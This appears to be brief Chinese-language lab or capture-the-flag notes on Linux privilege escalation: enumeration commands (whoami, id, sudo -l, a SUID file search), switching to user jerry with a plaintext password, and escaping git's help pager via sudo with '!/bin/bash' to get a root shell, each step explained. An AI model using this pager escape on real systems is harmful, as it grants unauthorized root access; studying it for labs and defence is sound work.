1、收集系统信息
```bash
whoami
id
sudo -l
find / -perm -4000 2>/dev/null
```
	`sudo -l` 是提权的关键命令，显示当前用户能以 root 身份免密执行哪些命令
    发现 tom 可以 sudo 运行 git
用户平移
```bash
su jerry
mima
```
2、利用git提权
```bash
sudo git -p help config
# 在 git 的 help 页面底部，输入：
!/bin/bash
```
	 `sudo git` 表示以 root 权限运行 git
     `-p help config` 让 git 分页显示帮助文档
     git 的帮助会使用分页器（默认是 less/more）
    在分页器中输入 `!` 可以执行系统命令
    `!/bin/bash` 就会以 root 权限 启动一个 bash Shell
